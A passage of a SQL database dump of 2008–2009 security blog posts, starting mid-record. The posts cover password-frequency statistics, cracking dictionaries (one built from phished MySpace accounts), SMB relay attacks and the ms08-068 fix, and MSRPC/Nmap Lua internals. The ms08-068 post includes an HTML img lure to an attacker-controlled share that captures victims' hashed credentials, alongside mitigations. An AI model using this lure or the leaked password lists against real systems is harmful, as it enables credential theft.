password88\r\n      1 password7\r\n      1 password42\r\n      1 password3\r\n      1 password1234\r\n      1 password11\r\n      1 Password1\r\n      1 password01\r\n      1 PassWord\r\n      1 password@\r\n      1 password_\r\n      1 forumpassword\r\n      1 1Password!\r\n      1 123password\r\n\nOver 600 people used \'password\' for their passwords, and 11 used \'password1\'. So 60x as many people don\'t even *try* to make themselves secure. 6 people used \'1password\', and nearly everybody who used a \'password\' variation either added or removed something from the beginning or the end. Additionally, everybody who played with case used either 1, 2, or all capitals, which supports my theory nicely.', '\'Hacking\'', 'https://blog.skullsecurity.org/2009/more-password-dictionaries');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (113, 'Password dictionaries', 'Ron Bowes', '2009-1-5', 'Greetings from 2009! \nI have a real post planned for the near future, but for now you\'re stuck with something short (and probably more useful, ultimately). I just wanted to draw attention to a few password databases I put on my wiki. You can find them here.\n\nFirst, the list included with John the Ripper. It\'s small, at 24kb, and is designed to be mutated/permutated. It\'s ordered by frequency, and the author has done a lot of research on common/weak passwords. There\'s a direct link here, and due to its size it\'s probably the best list for online cracking.\nNext, the list included with Cain and Able. It\'s significantly larger (3.3mb) and is targeted toward local cracking. The list I\'ve uploaded it alphabetized, I\'m not sure whether or not that\'s true for the original. Direct link. \nSeveral years ago, a list of phished MySpace accounts was publicly released. If you want the complete list (with emails (ie, usernames)), it was posted with the name \"myspace1.txt.bz2\" and is pretty easy to find.\nI removed the usernames from the list and ordered it by frequency. You can find that list here (if you want to know how many people used each password on the list, check here). \nAnd finally, the story that reminded me to do this: the Top 500 Worst Passwords. This list is the smallest I have, but is supposedly the 500 most common passwords used today. It\'s also ordered by frequency, and can be found here. \nYou might also find this useful, it\'s a list of all words in the English language. Maybe not useful for cracking passwords, but if you\'re writing a hangman solver (and the author likes using words like \"mesoblaster\"), it could be what you need. \nWhen I\'m doing bruteforcing and cracking, I always have trouble finding good lists of passwords. That\'s why I created that page in the first place, and I hope it helps others.', '\'Hacking\'', 'https://blog.skullsecurity.org/2009/password-dictionaries');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (114, 'How NOT to do CAPTCHAs', 'Ron Bowes', '2008-12-17', 'Yes, this is a real CAPTCHA that I ran across.\n\nIn case it isn\'t obvious from the picture, or you can\'t read that small, the text in the CAPTCHA matches the filename, therefore making it trivial to determine what the text says. Further, I tried specifying 6 random characters for the filename and it didn\'t work, which leads to two possibilities:\n\nThe CAPTCHA images are generated and saved in the root Web directory\nThere are a limited number of generated CAPTCHA images\n\nI can\'t easily tell which one is actually happening, but in both cases there\'s a serious issue. And funny, too!', '\'Humour\'', 'https://blog.skullsecurity.org/2008/how-not-to-do-captchas');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (115, 'Getting HKEY_PERFORMANCE_DATA', 'Ron Bowes', '2008-12-16', 'Hi everybody,\nI spent most of last Saturday exploring how SysInternals\' PsList program works, and how I could re-implement it as an Nmap script. I quickly discovered that the HKEY_PERFORMANCE_DATA (HKPD) registry hive was opened, then it got complicated. So I went digging for documentation and discovered a couple journals posts written by Microsoft\'s Matt Pietrek wrote back in 1996. Those led me to the WinPerf.h header file. The three of those together were enough to get this working.\n\nTo summarize, this is based on these resources:\n\nJournal post 1\nJournal post 2\nWinPerf.h (included with Visual Studio)\n\nThe HKEY_PERFORMANCE_DATA hive can be accessed either locally through standard registry API functions or remotely through MSRPC functions. Since MSRPC is essentially a layer on top of the API functions, these are essentially the same thing; as long as you have an administrator account, it doesn\'t matter where you\'re coming from, as long as you can call OpenHKPD() and QueryValue(). \nAn important thing to keep in mind is that this isn\'t standard registry stuff -- whereas the Windows registry is a (fairly) static collection of data in well known places, the HKEY_PERFORMANCE_DATA is a dynamically generated snapshot of the system\'s current state that isn\'t necessarily accessed through well known places (although it\'s pretty simple to get an index). You basically query for what you want, and get back a huge chunk of data that has to be parsed. The majority of this post will be related to the type of information you get back; how to actually parse it is described better in the references above. \nThere are likely libraries already written to parse performance data; in fact, in the link I gave above, Pietrek provides C++ code for parsing performance data locally. Since Nmap scripts are Lua, and I highly doubt that there\'s a Lua library written. So, everything I\'ve written is parsed by hand. \nAs of Nmap\'s SVN revision 11397, it can be found in svn://svn.insecure.org/nmap-exp/ron/nmap-smb (I haven\'t put it into the main trunk yet), in the file nselib/msrpcperformance.lua. \nTitle database\nNothing in the performance database is guaranteed to be static. To figure out where everything is, we need a mapping of numbers to names. So, first off, we\'ll get an index called the \"title database\". This index contains most text strings. Some of them are names of objects we can query (\"Process\", \"Job\", etc.) and others are names of actual counters (\"Bytes/second\", \"Writes/second\", \"Process ID\", etc.). To get this, connect to HKEY_PERFORMANCE_DATA and read the key \"Counter 009\":\n  openhkpd_result = msrpc.winreg_openhkpd(smbstate)\r\n  queryvalue_result = msrpc.winreg_queryvalue(smbstate, \r\n                                 openhkpd_result[\'handle\'], \"Counter 009\")\r\n\nThat returns a series of null-terminated strings. First a number, then its corresponding name, another number, its corresponding name, etc. Here\'s part of the output on my system (it should look similar on any modern Windows system):\n\r\n00000000 31 00 31 38 34 37 00 32 00 53 79 73 74 65 6d 00    1.1847.2.System.\r\n00000010 34 00 4d 65 6d 6f 72 79 00 36 00 25 20 50 72 6f    4.Memory.6.% Pro\r\n00000020 63 65 73 73 6f 72 20 54 69 6d 65 00 31 30 00 46    cessor Time.10.F\r\n00000030 69 6c 65 20 52 65 61 64 20 4f 70 65 72 61 74 69    ile Read Operati\r\n00000040 6f 6e 73 2f 73 65 63 00 31 32 00 46 69 6c 65 20    ons/sec.12.File\r\n00000050 57 72 69 74 65 20 4f 70 65 72 61 74 69 6f 6e 73    Write Operations\r\n00000060 2f 73 65 63 00 31 34 00 46 69 6c 65 20 43 6f 6e    /sec.14.File Con\r\n00000070 74 72 6f 6c 20 4f 70 65 72 61 74 69 6f 6e 73 2f    trol Operations/\r\n00000080 73 65 63 00 31 36 00 46 69 6c 65 20 52 65 61 64    sec.16.File Read\r\n.....\r\n         Length: 33459 [0x82b3]\r\n\nIt\'s pretty trivial to convert this to a table in Lua:\n\r\nlocal function parse_perf_title_database(data, pos)\r\n    local result = {}\r\n    repeat\r\n        local number, name\r\n        pos, number, name = bin.unpack(\"<zz\", data, pos)\r\n        result[tonumber(number)] = name\r\n    until pos >= #data\r\n\r\n    return true, pos, result\r\nend\r\n\nAfter parsing the title database, we have a mapping of index numbers to objects. For example, index \"230\" corresponds to the \"Process\" object. \n\r\n...\r\n000009b0 57 72 69 74 65 00 32 33 30 00 50 72 6f 63 65 73    Write.230.Proces\r\n000009c0 73 00 32 33 32 00 54 68 72 65 61 64 00 32 33 34    s.232.Thread.234\r\n000009d0 00 50 68 79 73 69 63 61 6c 44 69 73 6b 00 32 33    .PhysicalDisk.23\r\n000009e0 36 00 4c 6f 67 69 63 61 6c 44 69 73 6b 00 32 33    6.LogicalDisk.23\r\n000009f0 38 00 50 72 6f 63 65 73 73 6f 72 00 32 34 30 00    8.Processor.240.\r\n...\r\n\nThe request\nTo request process information, we query HKEY_PERFORMANCE_DATA for the value \"230\" (as a string). If we want to query for more than one object, that\'s also possible; any number of index numbers can be requested, separated by spaces. Since \"238\" corresponds to \"Processor\", if we want both Process (230) and Processor (238), we\'d query for \"230 238\" (or \"238 230\")\nAs long as they are valid index numbers, we\'re guaranteed to get the requested object; however, there\'s no guarantee that we\'ll only get that object back. The server will send back the requested object (or objects), and any objects that it thinks are required to properly describe the requested object. For example, to properly describe a thread, you need the process that it belongs to; when you request a \"Thread\" object, you\'ll also receive a \"Process\" object. In his journal postings, Pietrek used a really good metaphor when he described it: it\'s like ordering at a restaurant; you order your entrée, and it comes with free appetizers. Or maybe it\'s an awful metaphor and I\'m just hungry...\nIn any case, the data returned is defined by different structs found in WinPerf.h. The comments in WinPerf.h give a great deal of information about how things work. Basically, the data returned is a series of structs that are sequentially parsed. \nHere is the high level overview of which structs are processed\n\r\ntitle_database = QueryValue(\"Counter 009\")\r\n-- Query the data for \"230\", which is \"process\"\r\ndata = QueryValue(\"230\")\r\n\r\n-- Get the \"Data Block\" -- no matter what is queried, \r\n-- there will always be exactly one datablock. It describes\r\n-- how many objects were returned, among other things\r\ndata_block = parse_data_block(data)\r\n\r\n-- Parse each object.\r\nfor i = 1, data_block[\'NumObjectTypes\'] do\r\n  -- An object type is like a class definition\r\n  object_type = parse_object_type(data)\r\n\r\n  -- The object type tells us how many counters exist; parse\r\n  -- that many counter definitions\r\n  for j = 1, object_type[\'NumCounters\'], 1 do\r\n    counter_def[i] = parse_counter_def(data)\r\n  end\r\n\r\n  -- The object type also tells us how many instances of the object exist; \r\n  -- an instance of \"Process\" exists for every process running on the system. \r\n  for j = 1, object_type[\'NumInstances\'], 1 do\r\n    object_instance[j] = parse_instance_definition(data)\r\n\r\n    -- Each instance has counters associated with it, as defined by the object\r\n    -- definition\r\n    for k = 1, object_type[\'NumCounters\'], 1 do\r\n        counter_result = parse_counter(data, counter_definitions[k])\r\n    end\r\n  end\r\nend\r\n\nIn this, we ran across a lot of vocabulary (data blocks, object types, counter definitions, etc). Now, let\'s look at each of them a little bit deeper. \nData Block\nEvery time you make a request for performance data, no matter how many different objects you request, you get a single \"Data Block\". In WinPerf.h, it\'s defined as \"struct _PERF_DATA_BLOCK\". The data block returns the version and revision of the protocol, the lengths of the various pieces, and the name of the system. In an example run, these are some of the values returned to me:\n\r\nTotalByteLength: 7344\r\nHeaderLength: 112\r\nNumObjectTypes: 1\r\nLittleEndian: 1\r\nVersion: 1\r\nRevision: 1\r\nSystemTime: 1229465639\r\nSystemName: BASEWIN2K3\r\n\nThis tells that one type of object is returned (I know it\'s a \"Process\"). The other information is fairly self explanatory and is well defined in WinPerf.h. \nObject Type\nA query for performance data will return one or more object type structs. An object can be a \"Process\", a \"Thread\", a \"Job\", etc. When we requested the index \"230\", we were asking for a \"Process\" object (although we might get other types as well). Object types are defined in WinPerf.h as \"struct _PERF_OBJECT_TYPE\". Here\'s an example of what one can return:\n\r\nObjectNameTitleIndex: 230\r\nNumInstances: 26\r\nNumCounters: 27\r\nTotalByteLength: 7232\r\nHeaderLength: 64\r\nDefinitionLength: 1144\r\n\nThis tells us that it\'s a \"Process\" object (the ObjectNameTitleIndex is \'230\', which is looked up in the title database). It also tells us that there are 26 instances of the \"Process\" object, each of which have 27 counters. As we\'ll see in the next sections, the instances correspond to running processes (Explorer, System, WinLogon, etc), and the counters refer to the data we can pull (process id, priority, parent process, thread count, handle count, cpu usage, etc). \nCounter Definition\nNow, for each counter in this object, we get a definition and a name. Here are a few of the counters returned for the \"Process\" object (I won\'t display all 27 of them):\n\r\n...\r\nByteLength: 40\r\nCounterNameTitle: ID Process\r\nCounterNameTitleIndex: 784\r\nDetailLevel: 100\r\n\r\nByteLength: 40\r\nCounterNameTitle: Creating Process ID\r\nCounterNameTitleIndex: 1410\r\nDetailLevel: 100\r\n\r\nByteLength: 40\r\nCounterNameTitle: Thread Count\r\nCounterNameTitleIndex: 680\r\nDetailLevel: 200\r\n\r\nByteLength: 40\r\nCounterNameTitle: Priority Base\r\nCounterNameTitleIndex: 682\r\nDetailLevel: 200\r\n...\r\n\nThe length field is self explanatory. The CounterNameTitleIndex is the index in the title database (which is the first thing we talked about). The textual version displayed is the result of a title database lookup. The DetailLevel is interesting -- there are four possible values, 100, 200, 300, and 400. Values marked as \"100\" refer to counters that can be understood by any user, \"200\" are for administrators, and \"400\" are reserved for system developers. This lets a program display relevant information to users without knowing beforehand \nInstance Definition\nAn instance corresponds to one actual object that has counters. In the case of the \"Process\" object, the instance is the actual process. In other cases, an instance can be a single thread, a single network card, a single CPU, etc. Here are a couple \"Process\" instances:\n\r\nByteLength: 40\r\nInstanceName: Idle\r\n\r\nByteLength: 40\r\nInstanceName: System\r\n\r\nByteLength: 40\r\nInstanceName: smss\r\n\r\nByteLength: 40\r\nInstanceName: csrss\r\n\nCounter\nAnd finally, each of those instances has counters, as defined in the counter definitions. There is one counter per counter definition, and a counter is simply a size value followed by an 4- or 8-byte. \nConclusion\nSo, when all\'s said and done, this is the kind of information we can pull from just the Process object:\nHost script results:\r\n|  smb-enum-processes:\r\n|  Idle [0]\r\n|  | Parent: 0 [Idle]\r\n|  |_Priority: 0, Thread Count: 1, Handle Count: 0\r\n|  System [4]\r\n|  | Parent: 0 [Idle]\r\n|  |_Priority: 8, Thread Count: 49, Handle Count: 395\r\n|  smss [248]\r\n|  | Parent: 4 [System]\r\n|  |_Priority: 11, Thread Count: 3, Handle Count: 19\r\n|  csrss [300]\r\n|  | Parent: 248 [smss]\r\n|  |_Priority: 13, Thread Count: 11, Handle Count: 339\r\n|  winlogon [324]\r\n|  | Parent: 248 [smss]\r\n|  |_Priority: 13, Thread Count: 18, Handle Count: 506\r\n|  services [380]\r\n|  | Parent: 324 [winlogon]\r\n|  |_Priority: 9, Thread Count: 16, Handle Count: 272\r\n|\r\n.....\r\n\nThe most interesting thing, in my opinion, is that it\'s completely generic. You query for the title database, then for objects from the title database, and you get counters for those objects. The counters tell you their units (I skipped over that) and names, and what level of experience is required to understand them, in addition to their values. All this can be done in a totally generic way.', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/getting-hkey_performance_data');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (116, 'ms08-068 — Preventing SMBRelay Attacks', 'Ron Bowes', '2008-11-12', 'Microsoft released ms08-068 this week, which fixes a vulnerability that\'s been present and documented since 2001. I\'m going to write a quick overview of it here, although you\'ll probably get a better one by reading The Metasploit Blog.\n\nKeep in mind that there is a lot of fun stuff that can be done with the SMB protocol. I\'m going to talk about a few different design flaws right now, and point out exactly what ms08-068 patches. Hang on, though, this is going to get somewhat technical. The payoff, however, is that this is incredibly interesting stuff, and I\'m happy to clear up any technical confusion. Just leave me a comment or an email! \nI have talked about how Lanman and NTLM work (or fail to work) in the past, so I\'ll assume you\'ve read that and just post a quick overview here. Basically, Lanman and NTLM will hash your password using their respective algorithms (and store the hashes on the system), then hash it again based on the server\'s 8-byte challenge. This second hash is the same for Lanman and NTLM -- it takes the hash already generated, splits it into three 7-byte chunks (padding it to 21 bytes), and encrypting the server challenge with each of those chunks. If an attacker already has access to the Lanman and NTLM hashes, then the game has already been won (the hashes can be directly used to log in). \nThe primary advantage to having a server challenge is to prevent pre-computed attacks (that is, it provides salt-like value to prevent rainbow tables-style precomputation attacks against the algorithm). Naturally, a malicious server can send a known challenge and generate tables based on that. This type of attack has been fixed in NTLMv2 (since the client provides part of the randomness). \nA SMB Relay attack is a type of man-in-the-middle attack where the attacker asks the victim to authenticate to a machine controlled by the attacker, then relays the credentials to the target. The attacker forwards the authentication information both ways, giving him access. Here are the players in this scenario:\n\nThe attacker is the person trying to break into the target\nThe victim is the person who has the credentials\nThe target is the system the attacker wants access to, and that the victim has credentials for\n\nAnd here\'s the scenario (see the image at the right for a diagram):\n\n\nAttacker tricks the victim into connecting to him; this is easy, I\'ll explain how later\nAttacker establishes connection to the target, receives the 8-byte challenge\nAttacker sends the 8-byte challenge to victim\nVictim responds to the attacker with the password hash\nAttacker responds to the target\'s challenge with the victim\'s hash\nTarget grants access to attacker\n\nIn the case of Metasploit, the attacker goes on to upload and execute shellcode, but that process isn\'t important, and it\'s discussed on the Metasploit blog posting. \nNow, as an attacker, we have two problems: the victim needs to initiate a connection to the attacker, and the victim needs to have access to the target. \nThe first problem is easy to solve -- to initiate a session, send the user a link that goes to the attacker\'s machine. For example, send them to a Web site containing the following code:\n<img src=\"\\\\Attacker\\SHARE\\file.jpg\">\nTheir browser will attempt to connect to a share on the attacker called \"SHARE\", during which a session will be established. The victim\'s machine will automatically send the current credentials, hashed with whatever challenge is sent by the attacker (naturally, for the attack, this is the target\'s challenge). This can be delivered to them through an email link, through a stored cross-site scripting attack, by vandalizing a site they frequent, redirecting them with DNS poisoning, ARP spoofing, NetBIOS poisoning, and any number of other ways. Suffice to say, it\'s pretty easy to trick the victim into connecting to the attacker. \nThe second problem is that the victim needs to have access to the target. This one is slightly more difficult, but it can happen in a number of ways:\n\nIn a domain scenario, the user\'s domain account may have access to multiple machines, including the target\nIn other scenarios, users are well known to synchronize their password between machines. The target may have the same password as the victim, which would make the attack work\nThe target may be the same physical machine as the victim\n\nThat third point is the interesting one -- this can be used to exploit the computer itself! So, in that scenario, here are the modified steps (see the image at the right, although I think it\'s probably more confusing :) ):\n\n\nAttacker tricks the victim into connecting to him\nAttacker establishes connection back to the victim, receives the 8-byte challenge\nAttacker sends the victim\'s 8-byte back\nVictim responds to the attacker with the password hash that\'ll give the attacker access to the victim\'s own computer\nAttacker responds to the victim\'s challenge with the victim\'s hash\nVictim grants access to attacker\n\nHopefully that isn\'t too confusing. What it essentially means is that the victim will grant access to the attacker using its own credentials. \nAnd this particular attack is what ms08-068 patches! \nTo put it another way: ms08-068 patches an attack (discovered in 2001) where a victim is tricked into giving an attacker access to connect to itself. \nMitigation\nI talked a lot about vulnerabilities in the SMB protocol. Unfortunately, ms08-068 only fixes one of them. The issue is that the others are design flaws and can\'t be fixed without breaking clients. That being said, even though Microsoft can\'t fix them, you can fix them yourself, more or less, at the cost of potentially breaking clients (these can be done with local/domain security policies or registry hacks; search for them to find information):\n\nEnable (and require) NTLMv2 authentication -- this will prevent pre-computed attacks, because the client provides part of the randomness\nEnable (and require) message signing for both clients and servers -- this will prevent relay attacks\nInstall ms08-068 -- this will prevent a specific subset of relay attacks, where it\'s relayed back to itself\n\nHope that helps! \nAnd, as usual, if you have any questions feel free to track me down. \nRon', '\'Hacking\', \'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/ms08-068-preventing-smbrelay-attacks');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (117, 'Calling RPC functions over SMB', 'Ron Bowes', '2008-10-30', 'Hi everybody! \nThis is going to be a fairly high level discussion on the sequence of calls and packets required to make MSRPC calls over the SMB protocol. I\'ve learned this from a combination of reading the book Implementing CIFS, watching other tools do their stuff with Wireshark, and plain ol\' guessing/checking.\n\nBasically, I want to take you from the SMB protocol, which I\'ve discussed in previous posts, all the way down to making RPC calls against remote Windows systems. This is going to be quick, and light on detail, but it\'s only intended as an overview. If you want more information, follow the above references, take a peek at my Nmap scripts, or post a specific question. I\'m more than happy to answer! \nMaking a SMB connection\nSMB communication can be performed over ports tcp/445 and tcp/139. Port 445 allows for a \"raw\" SMB connection, while 139 is \"SMB over NetBIOS\". Effectively, they are the same thing with two differences:\n\nSMB over NetBIOS requires a \"NetBIOS Session Request\" packet, which is a client saying, \"hi, I\'m xxx, can I connect to you?\"\nSMB over NetBIOS has a packet length field that\'s 17 bits (maximum = 131,072), while Raw SMB has a packet length field that\'s 24 bits long (maximum = 16,777,216). Since protocol limitations stop you long before you reach these limits, they aren\'t significant.\n\nI don\'t want to dwell on it, but the NetBIOS Session Request looks like this (when sent from my Nmap scripts):\nNetBIOS Session Service\r\n +Length: 68\r\n +Called name: BASEWIN2K3<20>\r\n +Calling name: NMAP<20>\nThe trick here is that we need to find the server\'s name (\"BASEWIN2K3\") before we can make this request. This can be retrieved in a number of ways, but the easiest is to make an nbstat request over UDP/137, if possible, or check the DNS name.\nStarting a SMB Session\nIn a previous blog, in a section entitled \"Random SMB stuff\", I talked about the first three packets sent to SMB: SMB_COM_NEGOTIATE, SMB_COM_SESSION_SETUP_ANDX, and SMB_COM_TREE_CONNECT_ANDX. These three packets are still used to start the session:\n\nSMB_COM_NEGOTIATE -- Sent as normal\nSMB_COM_SESSION_SETUP_ANDX -- Contains authentication information, if we\'re logging in with a user account. I\'ll talk about the differences between the four primary levels (administrator, user, guest, anonymous) in another blog, and I talked about how to prepare your password in a previous blog. \nSMB_COM_TREE_CONNECT_ANDX -- We use this to connect to a special share \"IPC$\" (that\'s interprocess communication, not the place I work). Everybody should have access to this share, no matter the user level. \n\nAttaching to the pipe\nAfter the three standard initial packets, another common packet is sent -- SMB_COM_NT_CREATE. This is the packet used to create and open files. In this case, it\'s used to open a named pipe (since we\'re attached to the IPC$ share, you can\'t actually create files). This is done by opening what looks like a file. For example, some common pipes to open are:\n\n\\samr -- user management (SAM) functions\n\\srvsvc -- server management\n\\lsarpc -- local security authority\n\\winreg -- Windows registry\n\nOnce the file has successfully been opened, we can begin interacting with it via the SMB_TRANSACTION layer. If you\'re using a low-level account, you may hit an ACCESS_DENIED error here. \nThe links I provided contain all the information necessary to interact with each interface, put together in a C-like language. This includes the structors, packet opcodes, and input/output parameters. \nThe SMB_COM_TRANSACTION packet\nNow, I\'m no pro on this packet, and this is where my documentation ran out, but I\'ll explain how SMB_TRANSACTION works for my purposes. \nSMB_TRANSACTION allows different actions to be performed, depending on how it\'s called. The only action I\'ve used, however, is \"write to named pipe\". This lets us communicate with the back-end RPC services (although don\'t ask me how it works!). The SMB_TRANSACTION packet essentially implements a sub protocol -- the client takes data, wraps SMB_TRANSACTION around it, and sends it. When it arrives at the server, the SMB_TRANSACTION is taken off, and the raw data is passed to the function that needs it. When that function returns, SMB_TRANSACTION is wrapped around the returned data and it\'s sent back to the client, who removes the SMB_TRANSACTION and gets the returned data back. \nThose are all the SMB packets that are required to make the RPC calls! All calls are made through a sub-protocol, sent in the data of SMB_TRANSACTION. \nBinding to a service\nEven though we\'ve attached to a named pipe, we still have to declare which interface we want to communicate with. Generally, the pipe and the interface have to match (the \"\\samr\" pipe goes with the \"samr\" interface). \nHere are some common interfaces:\n\n\"\\samr\": 12345778-1234-abcd-ef00-0123456789ac\n\"\\srvsvc\": 4b324fc8-1670-01d3-1278-5a47bf6ee188\n\"\\lsarpc\": 12345778-1234-abcd-ef00-0123456789ab\n\"\\winreg\": 338cd001-2244-31f1-aaaa-900038001003\n\nTo bind to a service, the interface and version are sent, with some extra information, to the bind() function (via SMB_TRANSACTION). If the response is positive, then we are now bound to the service and can make calls against that service\'s functions. \nCalling a function\nFinally, once the interface is bound, we can call a function! \nTo call a function, we build a buffer containing the header, which is the same across all RPC stuff, the opnum/opcode of the function (operation number or operation code), and the marshalled \"in\" arguments of the function (that is, the sent arguments). This is sent up through SMB_TRANSACTION and is sent to the server. If all goes well, the server will return a buffer containing the header, the marshalled \"out\" arguments of the function, and the return value. (Marshalling is the process of taking a bunch of parameters and turning them into a stream of data.)\nLet\'s take a simple example from the \"winreg\" service, the OpenHKLM() function. That should be familiar to any Windows programmer, it opens a handle to HKEY_LOCAL_MACHINE. From the IDL file, which is distributed with Samba 4.0 and later, we can find the function definition:\n	/******************/\r\n	/* Function: 0x02 */\r\n	[public] WERROR winreg_OpenHKLM(\r\n		[in]      uint16 *system_name,\r\n		[in]      winreg_AccessMask access_mask,\r\n		[out,ref] policy_handle *handle\r\n	);\r\n\nSo from this, we know the opcode is 2, we\'re going to send two parameters, and receive a handle. \nHere is my Nmap script code to call this function (note that this is from a newer version of my code than I\'ve submitted -- in my current version, I marshall parameters by hand, but in this one it\'s abstracted away):\n\r\n--      [in]      uint16 *system_name,\r\n    arguments = msrpctypes.marshall_int16_ptr(0x1337)\r\n\r\n--      [in]      winreg_AccessMask access_mask,\r\n    arguments = arguments .. msrpctypes.marshall_winreg_AccessMask(\r\n                    msrpctypes.winreg_AccessMask[\'MAXIMUM_ALLOWED_ACCESS\']\r\n                   )\r\n\r\n--      [out,ref] policy_handle *handle\r\n\r\n    -- Do the call\r\n    status, result = call_function(smbstate, 0x02, arguments)\r\n\nSimple enough! The \"system_name\" parameter seemd to be filled with garbage in my tests, so I set it randomly and it works fine. \nWe\'ll explore the marshalling functions a little later, but first let\'s take a look at how the response is parsed:\n--      [in]      uint16 *system_name,\r\n--      [in]      winreg_AccessMask access_mask,\r\n--      [out,ref] policy_handle *handle\r\n    pos, response[\'handle\'] = msrpctypes.unmarshall_policy_handle(arguments, 1)\r\n\r\n    pos, response[\'return\'] = msrpctypes.unmarshall_int32(arguments, pos)\r\n\r\n    if(response[\'return\'] == nil) then\r\n        return false, \"Read off the end of the packet (winreg.openhku)\"\r\n    end\r\n    if(response[\'return\'] ~= 0) then\r\n        return false, smb.get_status_name(response[\'return\']) .. \" (winreg.openhku)\"\r\n    end\r\n\nSo the policy handle and return value are read. We check if return was \'nil\', which means we accidentally read past the end of the packet, and we checked if return was non-0, which indicates an error condition. \nThat\'s all there is to making function calls! Everything else is just headers, which are handled by other layers. The trickiest part I\'ve found is marshalling the parameters (which can actually be automated by parsing the .idl files). \nSo, on that topic....\nMarshalling Parameters\nThis is going to be a very brief summary, since marshalling parameters is tricky and full of pitfalls. The first thing to remember is that parameters will always be aligned at 4-byte boundaries (but members of structs within them may not be!). So, if you\'re adding a single character, you\'re also adding three blank spaces. I fill these with nulls, but you can send whatever you want (even 0x29a if you have two bytes to fill and you swing that way). Additionally, all string parameters are unicode, and some (but not all) are null terminated. \nSo without further ado, let\'s take a quick look at some data types! \ninteger values\nIntegers are the easiest ones. Here are the functions for adding int32, int16, and int8:\nfunction marshall_int32(int32)\r\n    return bin.pack(\"<I\", int32)\r\nend\r\n\r\nfunction marshall_int16(int16)\r\n    return bin.pack(\"<SS\", int16, 0)\r\nend\r\n\r\nfunction marshall_int8(int8)\r\n    return bin.pack(\"<CCS\", int8, 0, 0)\r\nend\r\n\nThe variables are just converted to little endian and put directly into the buffer. \nInteger pointers\nThe next one is a little trickier, pointers to integers:\nfunction marshall_int32_ptr(int32)\r\n    if(int32 == nil) then\r\n        return bin.pack(\"<I\", 0)\r\n    end\r\n\r\n    return bin.pack(\"<II\", REFERENT_ID, int32)\r\nend\r\n\r\nfunction marshall_int16_ptr(int16)\r\n    if(int16 == nil) then\r\n        return bin.pack(\"<I\", 0)\r\n    end\r\n\r\n    return bin.pack(\"<ISS\", REFERENT_ID, int16, 0)\r\nend\r\n\r\nfunction marshall_int8_ptr(int8)\r\n    if(int8 == nil) then\r\n        return bin.pack(\"<I\", 0)\r\n    end\r\n\r\n    return bin.pack(\"<ICCS\", REFERENT_ID, int8, 0, 0)\r\nend\r\n\nThe pointers are similar, except they have an extra 4-byte field in front, called a \"referent_id\" (at least by Wireshark). If the referent_id is non-zero, life goes on as usual; however, if the referent_id is zero, it\'s considered a \"null\" (or, in lua, \"nil\") pointer. \nStrings\nMarshalling a string gets a little bit deeper:\nfunction marshall_unicode(str, do_null, max_length)\r\n    local buffer_length\r\n\r\n    -- Check for null strings\r\n    if(str == nil) then\r\n        return bin.pack(\"<I\", 0)\r\n    end\r\n\r\n    if(do_null) then\r\n        buffer_length = string.len(str) + 1\r\n    else\r\n        buffer_length = string.len(str)\r\n    end\r\n\r\n    if(max_length == nil) then\r\n        max_length = buffer_length\r\n    end\r\n\r\n    return bin.pack(\"<IIIIA\",\r\n                REFERENT_ID,      -- Referent ID\r\n                max_length,       -- Max count\r\n                0,                -- Offset\r\n                buffer_length,    -- Actual count\r\n                string_to_unicode(str, do_null, true)\r\n            )\r\nend\r\n\nA string is basically a referent_id followed by three values -- max count, offset, and buffer count -- followed by the string itself, in unicode. The max count is the maximum length of the buffer (if data is being returned in the buffer, this tells the function how much room it has; otherwise, it\'s just the length of the string). The offset is always 0 in everything I\'ve looked at, so I ignore it. The actual count is the length of the string, counting the null terminator, if there is one. Note that my code handles both cases. \nStructs\nMy final example is going to be a series of structs that, together, represent a policy_handle:\ntypedef struct {\r\n      uint32 handle_type;\r\n      GUID   uuid;\r\n  } policy_handle;\r\n\nBecomes\nfunction marshall_policy_handle(policy_handle)\r\n    return bin.pack(\"<IA\", policy_handle[\'handle_type\'], \r\n                     marshall_guid(policy_handle[\'uuid\']))\r\nend\nThen this struct:\ntypedef [public,noprint,gensize,noejs] struct {\r\n      uint32 time_low;\r\n      uint16 time_mid;\r\n      uint16 time_hi_and_version;\r\n      uint8  clock_seq[2];\r\n      uint8  node[6];\r\n  } GUID;\r\n\nBecomes\nfunction marshall_guid(guid)\r\n    return bin.pack(\"<ISSAA\", guid[\'time_low\'], guid[\'time_high\'], \r\n                     guid[\'time_hi_and_version\'], guid[\'clock_seq\'], guid[\'node\'])\r\nend\nSummary\nIf you\'ve followed along, you\'ll see that the entire protocol is simply layers of abstraction, to the point where, when I\'m developing code, I\'m only implementing the parameter marshalling and unmarshalling. Everything else is taken care of by the same code that everything else uses. Even though the protocol itself is more or less one big kludge (or, in some respects, a group of smaller kludges, or a clusterkludge?), almost all of it can be abstracted away! \nHopefully this has been a fairly clear overview. I didn\'t want to dive too deeply right now, but to give a little taste of everything. Let me know if you have any questions or comments! \nRon', '\'NetBIOS/SMB\'', 'https://blog.skullsecurity.org/2008/calling-rpc-functions-over-smb');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (118, 'Matching passwords', 'Ron Bowes', '2008-10-15', 'Sometimes, I can\'t help but laugh...\n\n\nThat was an actual error message from Safeguard Easy (my work laptop\'s encryption software). Fortunately, my password only matched my own password, but what if it was somebody else\'s? It\'d be good to know that somebody else at work is using my password, just so I could be careful not to log into his account!', '\'Humour\'', 'https://blog.skullsecurity.org/2008/matching-passwords');
